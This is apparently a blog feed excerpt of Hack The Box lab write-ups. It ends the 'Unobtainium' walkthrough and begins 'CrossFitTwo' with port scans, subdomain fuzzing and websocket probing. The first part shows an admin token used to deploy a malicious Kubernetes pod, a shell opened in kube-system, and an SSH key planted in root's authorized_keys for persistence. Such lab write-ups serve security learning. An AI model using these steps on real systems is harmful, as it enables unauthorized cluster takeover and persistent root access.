<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./kubectl apply -f malicious-pod.yaml --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span>
./kubectl <span style="color:#8be9fd;font-style:italic">exec</span> alpine --stdin --tty -n kube-system --token <span style="color:#ff79c6">$(</span>cat admin-token<span style="color:#ff79c6">)</span> -- /bin/sh
/ <span style="color:#6272a4"># ls /mnt/root/</span>
pod_cleanup.py  root.txt
/ <span style="color:#6272a4"># mkdir /mnt/root/.ssh</span>
/ <span style="color:#6272a4"># echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHICeMSjvJisLHUNi5JMFm+Qf5cqFl3ZasVYE/CaAAI/ x@x.x&#34; &gt;&gt; /mnt/root/.ssh/authorized_keys</span>
/ <span style="color:#6272a4"># cat /mnt/root/root.txt</span>
e6a88047302bad5d712c329bed5efc94
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ssh-keygen -t ed2551
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
cat id_ed25519_unobtainium.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHICeMSjvJisLHUNi5JMFm+Qf5cqFl3ZasVYE/CaAAI/ x@x.x
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
ssh -i ~/.ssh/id_ed25519_unobtainium root@10.10.10.235
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
root@unobtainium:~#
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - CrossFitTwo</title><link>https://0xade1.github.io/posts/2021/09/htb-crossfittwo/</link><pubDate>Fri, 10 Sep 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/htb-crossfittwo/</guid><description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 sudo nmap -p22,80,8953 --min-rate 10000 -v 10.10.10.232 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8953/tcp open ub-dns-control sudo nmap -p 22,80,8953 -sCV 10.10.10.232 sudo nmap -p22,80,8953 -sCV 10.10.10.232 Starting Nmap 7.</description><content type="html"><![CDATA[<h2 id="nmap">nmap</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo nmap -p22,80,8953 --min-rate <span style="color:#bd93f9">10000</span> -v 10.10.10.232
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
8953/tcp open ub-dns-control

sudo nmap -p 22,80,8953 -sCV 10.10.10.232

sudo nmap -p22,80,8953 -sCV 10.10.10.232
Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2021-09-05 18:52 HKT
WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.232
Host is up <span style="color:#ff79c6">(</span>0.022s latency<span style="color:#ff79c6">)</span>.

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.4 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
80/tcp open http <span style="color:#ff79c6">(</span>PHP 7.4.12<span style="color:#ff79c6">)</span>
| fingerprint-strings:
| GetRequest, HTTPOptions:
| HTTP/1.0 <span style="color:#bd93f9">200</span> OK
| Connection: close
| Connection: close
| Content-type: text/html; <span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>UTF-8
| Date: Sun, <span style="color:#bd93f9">05</span> Sep <span style="color:#bd93f9">2021</span> 10:52:19 GMT
| Server: OpenBSD httpd
| X-Powered-By: PHP/7.4.12
| <span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
|<span style="color:#f1fa8c">\_</span>http-server-header: OpenBSD httpd
|<span style="color:#f1fa8c">\_</span>http-title: CrossFit
8953/tcp open ssl/ub-dns-control?
| ssl-cert: Subject: <span style="color:#8be9fd;font-style:italic">commonName</span><span style="color:#ff79c6">=</span>unbound
| Not valid before: 2021-01-11T07:01:10
|<span style="color:#f1fa8c">\_</span>Not valid after: 2040-09-28T07:01:10
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>We learn:</p>
<ul>
<li>the box is OpenBSD</li>
<li>port 80 is PHP server.</li>
<li>port 8953 TLS certificate shows it is running <code>unbound</code> service</li>
<li>No known vulnerabilities</li>
<li>searching for unbound: 8953 is the default port to control DNS name resolver. But it does not do DNS name resolution itself</li>
<li>The box is not listening on port 53</li>
</ul>
<h2 id="tcp-port-80-exploration">TCP port 80 exploration</h2>
<ul>
<li>index.php returns the same as index.html</li>
<li>Exploring the website contact page reveals a domain name: <code>contact@crossfit.htb</code></li>
<li>Member area goes to <code>http://employees.crossfit.htb/</code>. After adding the domain to <code>/etc/hosts</code> it reveals a login page and a <code>password-reset.php</code> page</li>
<li>password-reset.php requires a valid email address, otherwise we have an error: <code>Unknown email address.</code></li>
<li>Looking at Burp, there is one URL that stands out: <code>http://gym.crossfit.htb/ws/</code>. Generally ws stands for websocket</li>
<li>Exploring Javascript, only two scripts are custom. main.js has nothing interesting but ws.min.js seems interesting</li>
</ul>
<h3 id="gobuster---directory-bruteforce">gobuster - Directory Bruteforce</h3>
<p>Nothing interesting is reavealed:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -u http://crossfit.htb 		-w /opt/dictionaries/directory-list-2.3-medium.txt -t <span style="color:#bd93f9">50</span>
gobuster dir -u http://employees.crossfit.htb 	-w /opt/dictionaries/directory-list-2.3-medium.txt -t <span style="color:#bd93f9">50</span> -x php -b 403,404
</code></pre></td></tr></table>
</div>
</div><h3 id="exploring-for-more-vhosts">Exploring for more VHosts</h3>
<p>We run wfuzz a first time to identify we have to exclude response having 19035 characters. The second time:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wfuzz -u http://10.10.10.232 -H <span style="color:#f1fa8c">&#34;Host: FUZZ.crossfit.htb&#34;</span> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t <span style="color:#bd93f9">30</span> -hh <span style="color:#8be9fd;font-style:italic">19035</span>
<span style="color:#ff79c6">===================================================================</span>
ID           Response   Lines    Word     Chars       <span style="color:#8be9fd;font-style:italic">Payload</span>
<span style="color:#ff79c6">===================================================================</span>
000006363:   <span style="color:#bd93f9">200</span>        <span style="color:#bd93f9">84</span> L     <span style="color:#bd93f9">168</span> W    <span style="color:#bd93f9">4412</span> Ch     <span style="color:#f1fa8c">&#34;employees&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>Some important wfuzz limitation: <code>gym</code> subdomain is not found because it has the same output as the default page.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -s gym.crossfit.htb | wc
    <span style="color:#bd93f9">403</span>    <span style="color:#bd93f9">1172</span>   <span style="color:#bd93f9">19041</span>
curl -s 10.10.10.232 | wc
    <span style="color:#bd93f9">403</span>    <span style="color:#bd93f9">1172</span>   <span style="color:#bd93f9">19041</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="exploring-javascript-on-crossfithtb">Exploring Javascript on crossfit.htb</h3>
<p>Javascript beautifier <a href="jsnice.org">jsnice</a> makes the minimized js more readable</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#8be9fd;font-style:italic">var</span> token;
<span style="color:#8be9fd;font-style:italic">var</span> ws <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> WebSocket(<span style="color:#f1fa8c">&#34;ws://gym.crossfit.htb/ws/&#34;</span>);
</code></pre></td></tr></table>
</div>
</div><p>Later in the code, on the ws.ommessage function, the message is added to the html <code>&lt;div id=ws&gt;</code> block if the response starts with <code>Hello!</code>. The token is also updated.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">answer <span style="color:#ff79c6">=</span> response.message;
<span style="color:#ff79c6">if</span> (answer.startsWith(<span style="color:#f1fa8c">&#34;Hello!&#34;</span>)) {
  $(<span style="color:#f1fa8c">&#34;#ws&#34;</span>).show();
}
token <span style="color:#ff79c6">=</span> response.token;
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;container&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;ws&#34;</span> <span style="color:#50fa7b">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;display: none&#34;</span>&gt;
  &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;chat-main&#34;</span>&gt;&lt;/<span style="color:#ff79c6">div</span>&gt;
&lt;/<span style="color:#ff79c6">div</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>Adding gym.crossfit.htb to <code>/etc/hosts</code> and we now have a response code 101 with a switch to websocket protocol:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span> <span style="color:#bd93f9">101</span> Switching Protocols
Connection<span style="color:#ff79c6">:</span> Upgrade
Origin<span style="color:#ff79c6">:</span> http://10.10.10.232
Sec-WebSocket-Accept<span style="color:#ff79c6">:</span> +FQQtl4xLgJljnSLS5psbfw5Cjc=
Upgrade<span style="color:#ff79c6">:</span> websocket
</code></pre></td></tr></table>
</div>
</div><h2 id="gymcrossfithtb">gym.crossfit.htb</h2>
<h3 id="explore-websocket">Explore websocket</h3>
<p>Looking at <code>WebSockets history</code> tab on Burp we can see the ws response details:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#ff79c6">&#34;status&#34;</span>: <span style="color:#f1fa8c">&#34;200&#34;</span>,
  <span style="color:#ff79c6">&#34;message&#34;</span>: <span style="color:#f1fa8c">&#34;Hello! This is Arnold, your assistant. Type &#39;help&#39; to see available commands.&#34;</span>,
  <span style="color:#ff79c6">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;ae446276fdc231fc4ba4cd2de0c220d79667223f49dd813fe3f4fc6b9d4ba66a&#34;</span>
}
</code></pre></td></tr></table>
</div>
</div><p>We can interact with the websocket server if I pass the most recent <code>token</code></p>
<p>typing <code>help</code> I obtain the available commands</p>
<pre tabindex="0"><code>- coaches
- classes
- memberships
</code></pre><p><code>classes</code> and <code>coaches</code>, reveals nothing special but fitness classes or coaches; but if I type <code>memberships</code>, I obtain 4 plans with a button to check availability:</p>
<pre tabindex="0"><code>Check the availability of our membership plans with a simple click!
1-month ($99.99)
3-months ($129.99)
6-months ($189.99 $209.99)
1-year ($859.99 $899.99)
</code></pre><p>Clicking on each button reveals availability for each plan:</p>
<pre tabindex="0"><code>Good news! This membership plan is available.
Good news! This membership plan is available.
I'm sorry, this membership plan is currently unavailable.
Good news! This membership plan is availabl
</code></pre><p>The message sent to check plan availability has a params we can play a bit with:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ <span style="color:#ff79c6">&#34;message&#34;</span>: <span style="color:#f1fa8c">&#34;available&#34;</span>, <span style="color:#ff79c6">&#34;params&#34;</span>: <span style="color:#f1fa8c">&#34;1&#34;</span>, <span style="color:#ff79c6">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;41[..]&#34;</span> }
</code></pre></td></tr></table>
</div>
</div><p>and the response contains some interesting fields <code>debug.id</code> and <code>debug.name</code>:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#ff79c6">&#34;status&#34;</span>: <span style="color:#f1fa8c">&#34;200&#34;</span>,
  <span style="color:#ff79c6">&#34;message&#34;</span>: <span style="color:#f1fa8c">&#34;Good news! This membership plan is available.&#34;</span>,
  <span style="color:#ff79c6">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;2087bb765c83c66cfefc97aeaf7d79a031c71dbabf7b1c9ee6c571346e903ada&#34;</span>,
  <span style="color:#ff79c6">&#34;debug&#34;</span>: <span style="color:#f1fa8c">&#34;[id: 1, name: 1-month]&#34;</span>
}
</code></pre></td></tr></table>
</div>
</div><p>We can send the message to repeater but it is quickly annoying to repeatedly copy-paste newest <code>token</code>. Python3 <code>websockets</code> module can help:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python3 <span style="color:#ff79c6">-</span>m pip install <span style="color:#ff79c6">--</span>upgrade pip
python3 <span style="color:#ff79c6">-</span>m pip install websockets
python3 <span style="color:#ff79c6">-</span>m websockets ws:<span style="color:#ff79c6">//</span>gym<span style="color:#ff79c6">.</span>crossfit<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">/</span>ws
Connected to ws:<span style="color:#ff79c6">//</span>gym<span style="color:#ff79c6">.</span>crossfit<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">/</span>ws<span style="color:#ff79c6">.</span>
<span style="color:#ff79c6">&lt;</span> {<span style="color:#f1fa8c">&#34;status&#34;</span>:<span style="color:#f1fa8c">&#34;200&#34;</span>,<span style="color:#f1fa8c">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Hello! This is Arnold, your assistant. Type &#39;help&#39; to see available commands.&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;a434829e9a694db99564774e93965fb78c9377d81565217de645da1dc1365761&#34;</span>}
